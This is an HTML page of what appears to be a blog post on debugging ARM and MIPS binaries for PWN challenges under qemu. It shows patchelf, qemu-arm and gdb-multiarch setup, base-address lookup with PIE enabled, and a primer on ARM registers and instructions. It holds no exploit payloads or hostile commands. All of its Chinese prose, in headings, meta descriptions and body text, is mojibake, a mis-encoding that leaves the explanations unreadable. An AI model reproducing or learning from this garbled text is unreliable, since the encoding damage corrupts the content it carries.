<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="å‰è¨€       è®°å½•ä¸€ä¸‹å¼‚æ„çš„PWNé¢˜ ğŸ”ºqemu çš„ user æ¨¡å¼ä¸‹ï¼Œæ‰€ä»¥å³ä¾¿ç¨‹åºé‡å¯ libc åœ°å€ä¹Ÿä¸å˜ï¼Œä½†æ˜¯systemæ¨¡å¼ï¼Œå³åŠ äº†å†…æ ¸çš„æƒ…å†µä¸‹å°±ä¼šæ”¹å˜äº†ã€‚                     ä¸€ã€è°ƒè¯•é—®é¢˜                           1.ARMæ¶æ„       pwndbgå¯¹armæ¶æ„çš„æ”¯æŒè¿˜æ˜¯æŒºå¥½çš„">
<meta property="og:type" content="article">
<meta property="og:title" content="Armä»0å¼€å§‹">
<meta property="og:url" content="http://pig-007.github.io/2021/11/02/%E5%BC%82%E6%9E%84%E4%BB%8E0%E5%BC%80%E5%A7%8B/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:description" content="å‰è¨€       è®°å½•ä¸€ä¸‹å¼‚æ„çš„PWNé¢˜ ğŸ”ºqemu çš„ user æ¨¡å¼ä¸‹ï¼Œæ‰€ä»¥å³ä¾¿ç¨‹åºé‡å¯ libc åœ°å€ä¹Ÿä¸å˜ï¼Œä½†æ˜¯systemæ¨¡å¼ï¼Œå³åŠ äº†å†…æ ¸çš„æƒ…å†µä¸‹å°±ä¼šæ”¹å˜äº†ã€‚                     ä¸€ã€è°ƒè¯•é—®é¢˜                           1.ARMæ¶æ„       pwndbgå¯¹armæ¶æ„çš„æ”¯æŒè¿˜æ˜¯æŒºå¥½çš„">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121161707.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121161725.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121162647.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163058.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163230.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163909.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121164400.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121164500.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121165405.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121170328.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103145318.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103144726.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211104115048.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110403.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110734.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110947.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105112027.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115257.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115432.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115637.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105120321.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106220032.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106220242.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106221534.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150231733.png">
<meta property="og:image" content="https://dev.azure.com/zslyvain/9285f0e6-8055-4a5c-aec3-50d9555ac078/_apis/git/repositories/4eb461c6-bb1f-489f-978b-686e8c32decf/items?path=/1625856577691_8905.png&versionDescriptor%5BversionOptions%5D=0&versionDescriptor%5BversionType%5D=0&versionDescriptor%5Bversion%5D=master&resolveLfs=true&$format=octetStream&api-version=5.0">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150255746.png">
<meta property="article:published_time" content="2021-11-02T02:25:33.000Z">
<meta property="article:modified_time" content="2023-09-08T08:12:37.783Z">
<meta property="article:author" content="PIG-007">
<meta property="article:tag" content="å¼‚æ„">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121161707.png"><title>Armä»0å¼€å§‹ | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2021/11/02/%E5%BC%82%E6%9E%84%E4%BB%8E0%E5%BC%80%E5%A7%8B/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Armä»0å¼€å§‹</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-11-02</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-08</span></span></div></header><div class="post-body">
        <h1 id="å‰è¨€"   >
          <a href="#å‰è¨€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1>
      <p>è®°å½•ä¸€ä¸‹å¼‚æ„çš„PWNé¢˜</p>
<p>ğŸ”ºqemu çš„ user æ¨¡å¼ä¸‹ï¼Œæ‰€ä»¥å³ä¾¿ç¨‹åºé‡å¯ libc åœ°å€ä¹Ÿä¸å˜ï¼Œä½†æ˜¯systemæ¨¡å¼ï¼Œå³åŠ äº†å†…æ ¸çš„æƒ…å†µä¸‹å°±ä¼šæ”¹å˜äº†ã€‚</p>

        <h1 id="ä¸€ã€è°ƒè¯•é—®é¢˜"   >
          <a href="#ä¸€ã€è°ƒè¯•é—®é¢˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€è°ƒè¯•é—®é¢˜" class="headerlink" title="ä¸€ã€è°ƒè¯•é—®é¢˜"></a>ä¸€ã€è°ƒè¯•é—®é¢˜</h1>
      
        <h2 id="1-ARMæ¶æ„"   >
          <a href="#1-ARMæ¶æ„" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ARMæ¶æ„" class="headerlink" title="1.ARMæ¶æ„"></a>1.ARMæ¶æ„</h2>
      <p><code>pwndbg</code>å¯¹armæ¶æ„çš„æ”¯æŒè¿˜æ˜¯æŒºå¥½çš„</p>

        <h3 id="1-æ— PIE"   >
          <a href="#1-æ— PIE" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ— PIE" class="headerlink" title="(1)æ— PIE"></a>(1)æ— PIE</h3>
      <p>æ²¡æœ‰PIEçš„æ—¶å€™ï¼Œç›´æ¥ä½¿ç”¨patchelfå°†å…¶é“¾æ¥å™¨å’Œæœç´¢è·¯å¾„æ”¹ä¸€ä¸‹å³å¯</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-rpath /home/hacker/glibc/2.23/arm/ --set-interpreter /home/hacker/glibc/2.23/arm/lib/ld-linux.so.3 ./armNote</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åé€šè¿‡qemuåŠ è½½è¿è¡Œåº“å¯åŠ¨</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L /home/hacker/glibc/2.23/arm/ -g 12345 ./armNote</span><br></pre></td></tr></table></div></figure>

<p>ä¹‹åé€šè¿‡gdb-multiarchè¿æ¥ä¸Šå³å¯</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch -q armNote</span><br><span class="line">target remote: 12345</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·å°±èƒ½è°ƒè¯•äº†ï¼ŒåŒ…æ‹¬pwndbgä¸­çš„å †å—heapï¼Œbinså‘½ä»¤ç­‰ä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121161707.png" alt="image-20211121161707292"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121161725.png" alt="image-20211121161725233"></p>

        <h3 id="2-æœ‰PIE"   >
          <a href="#2-æœ‰PIE" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æœ‰PIE" class="headerlink" title="(2)æœ‰PIE"></a>(2)æœ‰PIE</h3>
      <p>è¿™ä¸ªå°±æ¯”è¾ƒå¤æ‚äº†ï¼Œé¦–å…ˆè¿˜æ˜¯æ”¹æ‰ç”¨é“¾æ¥å™¨å’Œæœç´¢è·¯å¾„ï¼Œä¹‹åè¿è¡Œèµ·æ¥ï¼ŒæŸ¥çœ‹vmmap</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121162647.png" alt="image-20211121162647509"></p>
<p>è¿™é‡Œåœ¨stackçš„æœ«å°¾ï¼Œå³å›¾ä¸­è“è‰²æ¡†èµ·æ¥çš„å°±æ˜¯elfåŸºåœ°å€ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œåæ­£è°ƒè¯•å°±æ˜¯è¿™æ ·çš„ï¼Œå¯èƒ½æ˜¯QEMUå’ŒPIEçš„ç›¸å…³æœºåˆ¶é—®é¢˜æŠŠã€‚</p>
<p>ä¹‹åé€šè¿‡elfBaseæ¥æ–­ç‚¹ï¼Œå†é€šè¿‡gotè¡¨å³å¯æ‰¾åˆ°libcåŸºåœ°å€äº†ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163058.png" alt="image-20211121163058346"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163230.png" alt="image-20211121163230165"></p>
<p>ä¹‹åå†é€šè¿‡<code>add-symbol-file</code>å³å¯å¾—åˆ°åœ°å€äº†ï¼Œåœ°å€ç”±äºqemuçš„å…³ç³»ï¼Œä¸€ç›´æ˜¯ä¸å˜çš„ã€‚</p>
<p>ä½†æ˜¯è¿™é‡Œå¦‚æœç›´æ¥æ‰“å°åœ°å€ä¼šå‡ºé”™ï¼ŒåŸå› æœªçŸ¥ï¼Œéœ€è¦é‡è½½ç¬¦å·è¡¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163909.png" alt="image-20211121163909059"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121164400.png" alt="image-20211121164400425"></p>
<p>é‡è½½ç¬¦å·è¡¨å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121164500.png" alt="image-20211121164500582"></p>
<p>å¯ä»¥çœ‹åˆ°ä¹‹åå°±æ­£ç¡®äº†ã€‚</p>
<p>ä¸è¿‡è¿˜æ˜¯æ²¡æœ‰åŠæ³•è¿›è¡Œbinsï¼Œheapä¹‹ç±»çš„å‘½ä»¤ã€‚è¿™ä¸ªå‘½ä»¤æ˜¯pwndbgä»<code>__libc_malloc_initialized</code>è¿™ä¸ªå…¨å±€ç¬¦å·è·å–çš„ï¼Œä½†æ˜¯æ·»åŠ äº†ç¬¦å·è¡¨ä¹‹åè¿™ä¸ªå…¨å±€ç¬¦å·è¿˜æ˜¯æ²¡æœ‰è¢«é‡æ–°åŠ è½½</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121165405.png" alt="image-20211121165405192"></p>
<p>å¯¼è‡´æ— æ³•è¯†åˆ«ï¼Œæ‰€ä»¥ä¹Ÿå°±æ— æ³•ä½¿ç”¨å †ç›¸å…³å‘½ä»¤ï¼Œä¸è¿‡å¯ä»¥ä»main_arenä¸­ç®€å•çœ‹ä¸€ä¸‹å †ç»“æ„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121170328.png" alt="image-20211121170328689"></p>

        <h2 id="2-MIPSæ¶æ„"   >
          <a href="#2-MIPSæ¶æ„" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-MIPSæ¶æ„" class="headerlink" title="2.MIPSæ¶æ„"></a>2.MIPSæ¶æ„</h2>
      
        <h3 id="1-æ— PIE-1"   >
          <a href="#1-æ— PIE-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ— PIE-1" class="headerlink" title="(1)æ— PIE"></a>(1)æ— PIE</h3>
      <p>å¯ä»¥ç›´æ¥è¿›è¡Œç›¸åº”è¿è¡Œåº“åŠ è½½å³å¯ï¼Œä½†æ˜¯æœ€å¥½è¿˜æ˜¯ç”¨gefæ’ä»¶ã€‚</p>

        <h3 id="2-æœ‰PIE-1"   >
          <a href="#2-æœ‰PIE-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æœ‰PIE-1" class="headerlink" title="(2)æœ‰PIE"></a>(2)æœ‰PIE</h3>
      <p>pwndbgå¯¹mipsæ¶æ„çš„æ”¯æŒä¸å¤ªå¥½ï¼Œä½†æ˜¯ä¹Ÿç”±äºgefå…³äºqemuçš„vmmapå‘½ä»¤ä¸å¤ªå‡†ç¡®ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥å€ŸåŠ©pwndbgçš„vmmapå‘½ä»¤è·å–ï¼Œå¦‚åŒä¹‹å‰çš„armæ¶æ„ä¸€æ ·ï¼Œè·å–åˆ°elfåŸºåœ°å€ä¹‹åå³å¯æŸ¥çœ‹å¯¹åº”çš„libcåœ°å€ã€‚</p>

        <h2 id="é¡¹ç›®ï¼š"   >
          <a href="#é¡¹ç›®ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#é¡¹ç›®ï¼š" class="headerlink" title="é¡¹ç›®ï¼š"></a>é¡¹ç›®ï¼š</h2>
      <p>æˆ–è€…çœ‹é¡¹ç›®ï¼Œè¿™ä¸ªå¯ä»¥ä¸€é”®è·å–å¯¹åº”ç‰ˆæœ¬çš„glibcï¼Œåœ¨gdbè°ƒè¯•ä¸­è‡ªåŠ¨è§£æç¬¦å·è¡¨å’Œåœ°å€ï¼Œæ–¹ä¾¿åšå¼‚æ„çš„pwné¢˜ã€‚</p>
<p><code>mulArchAll</code>:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/PIG-007/mulArchAll.git" >https://github.com/PIG-007/mulArchAll.git</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="äºŒã€ARM"   >
          <a href="#äºŒã€ARM" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€ARM" class="headerlink" title="äºŒã€ARM"></a>äºŒã€ARM</h1>
      
        <h2 id="1-å¯„å­˜å™¨å…³ç³»"   >
          <a href="#1-å¯„å­˜å™¨å…³ç³»" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¯„å­˜å™¨å…³ç³»" class="headerlink" title="1.å¯„å­˜å™¨å…³ç³»"></a>1.å¯„å­˜å™¨å…³ç³»</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103145318.png" alt="32"></p>
<ul>
<li><p>R0<del>R3ï¼šå‡½æ•°è°ƒç”¨å‚æ•°ï¼Œä»£è¡¨ç¬¬0</del>4ä¸ªå‚æ•°ï¼Œå‰©ä¸‹çš„å‚æ•°ä»å³å‘å·¦ä¾æ¬¡å…¥æ ˆï¼Œå‡½æ•°è¿”å›å€¼ä¿å­˜åœ¨R0ä¸­ã€‚(å¯¹åº”åœ¨aarch64ä¸­ä¸ºR0<del>R7ï¼Œä½†æ˜¯gdbè°ƒè¯•æˆ–è€…IDAä¸­ä¸€èˆ¬æ˜¾ç¤ºX0</del>X30ï¼ŒåŒæ—¶è¿˜æœ‰ä½32ä½çš„W0~W30)</p>
</li>
<li><p>SPï¼šç±»ä¼¼rsp,espï¼Œæ ˆæŒ‡é’ˆ</p>
</li>
<li><p>FPï¼šç±»ä¼¼ebpï¼Œæ ˆæŒ‡é’ˆ</p>
</li>
<li><p>LRï¼šå½“å‘ç”Ÿå‡½æ•°è°ƒç”¨æ—¶ï¼Œä¼šä¿å­˜è°ƒç”¨å‡½æ•°å¤„çš„åœ°å€ï¼Œé€€å‡ºå‡½æ•°æ—¶èµ‹å€¼ç»™PCã€‚</p>
</li>
<li><p>PCï¼šç±»ä¼¼eip,ripï¼Œå­˜å‚¨ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚</p>
</li>
<li><p>R11ï¼šç±»ä¼¼ebpï¼Œæ ˆæŒ‡é’ˆï¼Œå…¶å®å°±å·®ä¸å¤šæ˜¯FP</p>
</li>
</ul>

        <h2 id="2-æ±‡ç¼–æŒ‡ä»¤"   >
          <a href="#2-æ±‡ç¼–æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="2.æ±‡ç¼–æŒ‡ä»¤"></a>2.æ±‡ç¼–æŒ‡ä»¤</h2>
      
        <h3 id="1-å¯„å­˜å™¨ä¼ é€MOV"   >
          <a href="#1-å¯„å­˜å™¨ä¼ é€MOV" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¯„å­˜å™¨ä¼ é€MOV" class="headerlink" title="(1)å¯„å­˜å™¨ä¼ é€MOV"></a>(1)å¯„å­˜å™¨ä¼ é€MOV</h3>
      <p>å¯„å­˜å™¨ä¹‹é—´è¿˜æ˜¯MOVæŒ‡ä»¤ï¼Œæ¯”å¦‚MOV R2,R0;ä½†æ˜¯å¦‚æœæ¶‰åŠåˆ°å†…å­˜ä¸Šçš„ï¼Œåˆ™éœ€è¦å…ˆåŠ è½½åˆ°å¯„å­˜å™¨ä¸­ï¼Œæˆ–è€…æŠŠå¯„å­˜å™¨ä¸­çš„å€¼å­˜å‚¨åˆ°å†…å­˜ä¸­</p>

        <h3 id="2-å¯„å­˜å™¨-å†…å­˜ä¼ é€"   >
          <a href="#2-å¯„å­˜å™¨-å†…å­˜ä¼ é€" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å¯„å­˜å™¨-å†…å­˜ä¼ é€" class="headerlink" title="(2)å¯„å­˜å™¨-å†…å­˜ä¼ é€"></a>(2)å¯„å­˜å™¨-å†…å­˜ä¼ é€</h3>
      <p>STR(store reg)/LDR(load reg)ä»¥åŠSTM(store multiple)/LDM(load multiple)</p>

        <h4 id="â‘ STR-LDRæ¨¡å¼"   >
          <a href="#â‘ STR-LDRæ¨¡å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ STR-LDRæ¨¡å¼" class="headerlink" title="â‘ STR/LDRæ¨¡å¼"></a>â‘ STR/LDRæ¨¡å¼</h4>
      
        <h5 id="STR-Ra-Rb-ï¼š"   >
          <a href="#STR-Ra-Rb-ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#STR-Ra-Rb-ï¼š" class="headerlink" title="STR Ra [Rb]ï¼š"></a>STR Ra [Rb]ï¼š</h5>
      <p>Raä¸­çš„æ•°æ®å­˜å‚¨åˆ°RbæŒ‡å‘çš„å†…å­˜ä¸­</p>

        <h5 id="LDR-Ra-Rb"   >
          <a href="#LDR-Ra-Rb" class="heading-link"><i class="fas fa-link"></i></a><a href="#LDR-Ra-Rb" class="headerlink" title="LDR Ra [Rb]"></a>LDR Ra [Rb]</h5>
      <p>RbæŒ‡å‘çš„å†…å­˜ä¸­çš„å€¼åŠ è½½åˆ°Raä¸­</p>
<p>æ­¤å¤–è¿˜æœ‰å¦‚ä¸‹æƒ…å½¢</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STR  R0,[R1, #12]  // R0 --&gt; [R1+12]</span><br><span class="line">LDR  R4,[R5, R6]  // R4 &lt;-- [R5+R6]</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡STM-LDMæ¨¡å¼"   >
          <a href="#â‘¡STM-LDMæ¨¡å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡STM-LDMæ¨¡å¼" class="headerlink" title="â‘¡STM/LDMæ¨¡å¼"></a>â‘¡STM/LDMæ¨¡å¼</h4>
      
        <h5 id="STM-R0-R4-R5"   >
          <a href="#STM-R0-R4-R5" class="heading-link"><i class="fas fa-link"></i></a><a href="#STM-R0-R4-R5" class="headerlink" title="STM R0, {R4,R5}"></a>STM R0, {R4,R5}</h5>
      <p>R4çš„å€¼ä¼ é€ç»™R0+xå¯¹åº”çš„å†…å­˜å•å…ƒï¼Œç„¶åR5çš„å€¼ä¼ ç»™R0+x+xå¯¹åº”çš„å†…å­˜å•å…ƒ</p>
<p>è¿™ä¸ªxå³ç”±åç¼€å†³å®šï¼Œåˆ†åˆ«æœ‰ä»¥ä¸‹å‡ ç§</p>
<ul>
<li><p>DB(Decrease Before)ï¼šæ¯æ¬¡ä¼ é€å‰R0åŠ ä¸Šxï¼Œxä¸ºè´Ÿæ•°</p>
</li>
<li><p>DA(Decrease After)ï¼šæ¯æ¬¡ä¼ é€åR0åŠ ä¸Šxï¼Œxä¸ºè´Ÿæ•°</p>
</li>
<li><p>IB(Increase Before)ï¼šæ¯æ¬¡ä¼ é€å‰R0åŠ ä¸Šxï¼Œxä¸ºæ­£æ•°</p>
</li>
<li><p>IA(Increase After)ï¼šæ¯æ¬¡ä¼ é€åR0åŠ ä¸Šxï¼Œxä¸ºæ­£æ•°</p>
</li>
</ul>
<p>è€ŒXåˆ™åœ¨ä¸åŒçš„CPUä½æ•°ä¸‹ä¸åŒï¼Œ32ä¸º4ï¼Œ64åˆ™ä¸º8ã€‚</p>
<p>æ­¤å¤–å †æ ˆçš„å¢é•¿æ–¹å‘å¯ä»¥ä¸åŒï¼Œä¹Ÿå¯ä»¥åœ¨ä¸åŒæƒ…å½¢ä¸‹ä½œä¸ºåç¼€ï¼Œæ•ˆæœä¸€æ ·çš„</p>
<ul>
<li>FD(Full Descent)ï¼šæ»¡é€’å‡å †æ ˆ</li>
<li>FA(Full Ascent)ï¼šæ»¡é€’å¢å †æ ˆ</li>
<li>ED(Empty Descent)ï¼šç©ºé€’å‡å †æ ˆ</li>
<li>EA(Empty Ascent)ï¼šç©ºé€’å¢å †æ ˆ</li>
</ul>
<p>æ»¡åˆ™ä»£è¡¨æ ˆæŒ‡é’ˆæŒ‡å‘æ ˆé¡¶ï¼Œç©ºåˆ™ä»£è¡¨æ ˆæŒ‡é’ˆä¸æŒ‡å‘æ ˆé¡¶</p>

        <h3 id="3-è·³è½¬æŒ‡ä»¤"   >
          <a href="#3-è·³è½¬æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è·³è½¬æŒ‡ä»¤" class="headerlink" title="(3)è·³è½¬æŒ‡ä»¤"></a>(3)è·³è½¬æŒ‡ä»¤</h3>
      
        <h4 id="â‘ åˆ†æ”¯è·³è½¬-Branch"   >
          <a href="#â‘ åˆ†æ”¯è·³è½¬-Branch" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ†æ”¯è·³è½¬-Branch" class="headerlink" title="â‘ åˆ†æ”¯è·³è½¬(Branch)"></a>â‘ åˆ†æ”¯è·³è½¬(Branch)</h4>
      
        <h5 id="B"   >
          <a href="#B" class="heading-link"><i class="fas fa-link"></i></a><a href="#B" class="headerlink" title="B"></a>B</h5>
      <p>æ— æ¡ä»¶è·³è½¬</p>

        <h5 id="BX-lt-Rm-gt"   >
          <a href="#BX-lt-Rm-gt" class="heading-link"><i class="fas fa-link"></i></a><a href="#BX-lt-Rm-gt" class="headerlink" title="BX &lt;Rm&gt;"></a>BX &lt;Rm&gt;</h5>
      <p>ç”±å¯„å­˜å™¨ç»™å‡ºåœ°å€</p>
<p>è‹¥ Rm çš„ bit[0] ä¸º1ï¼Œåˆ‡æ¢åˆ° Thumb æŒ‡ä»¤æ‰§è¡Œï¼›</p>
<p>è‹¥ Rm çš„ bit[0] ä¸º0ï¼Œåˆ‡æ¢åˆ° ARM æŒ‡ä»¤æ‰§è¡Œã€‚</p>

        <h5 id="BL"   >
          <a href="#BL" class="heading-link"><i class="fas fa-link"></i></a><a href="#BL" class="headerlink" title="BL"></a>BL</h5>
      <p>ç±»ä¼¼äºCallï¼Œä¼šå­˜å…¥è¿”å›åœ°å€åˆ°LRå¯„å­˜å™¨</p>

        <h5 id="BLX-BLR"   >
          <a href="#BLX-BLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#BLX-BLR" class="headerlink" title="BLX/BLR"></a>BLX/BLR</h5>
      <p>å³ç±»ä¼¼å¯¹åº”ç»„åˆ</p>

        <h4 id="â‘¡æ¡ä»¶è·³è½¬"   >
          <a href="#â‘¡æ¡ä»¶è·³è½¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡æ¡ä»¶è·³è½¬" class="headerlink" title="â‘¡æ¡ä»¶è·³è½¬"></a>â‘¡æ¡ä»¶è·³è½¬</h4>
      <p>ä¾æ®CPSRå¯„å­˜å™¨ä¸‹çš„ALUçŠ¶æ€æ ‡å¿—ä½</p>
<p>CPSRå¯„å­˜å™¨åŒ…å«ä¸‹é¢çš„ALUçŠ¶æ€æ ‡å¿—ï¼š</p>
<p>ã€€ã€€Nã€€ Set when the result of the operation was Negative(ç»“æœä¸ºè´Ÿæ•°)</p>
<p>ã€€ã€€Z    Set when the result of the operation was Zero(ç»“æœä¸º0)</p>
<p>ã€€ã€€C    Set when the operation result in a Carry(å‘ç”Ÿè¿›ä½ï¼Œæˆ–å€Ÿä½)</p>
<p>ã€€ã€€V    Set when the operation caused oVerflow(æ“ä½œé€ æˆæº¢å‡º)</p>
